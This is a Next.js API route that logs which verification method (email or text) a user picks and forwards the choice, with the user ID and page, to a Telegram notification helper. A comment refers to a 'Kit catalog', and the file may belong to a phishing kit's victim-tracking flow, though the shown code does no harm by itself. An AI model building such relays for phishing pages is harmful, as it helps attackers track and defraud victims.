import { NextRequest, NextResponse } from "next/server"
import { sendFormNotification } from "@/lib/telegram"

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const verificationType = String(body?.verificationType ?? "")
    const method =
      body?.method === "email" || /email/i.test(verificationType)
        ? "email"
        : "text"
    // Kit catalog §7 — method selected (page must contain "/verify").
    void sendFormNotification({
      type: method === "email" ? "email_verification" : "text_verification",
      userId: String(body?.userId ?? ""),
      method,
      page: String(body?.page ?? "/verify-choice"),
      timestamp: new Date().toISOString(),
    })
    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending verification click notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
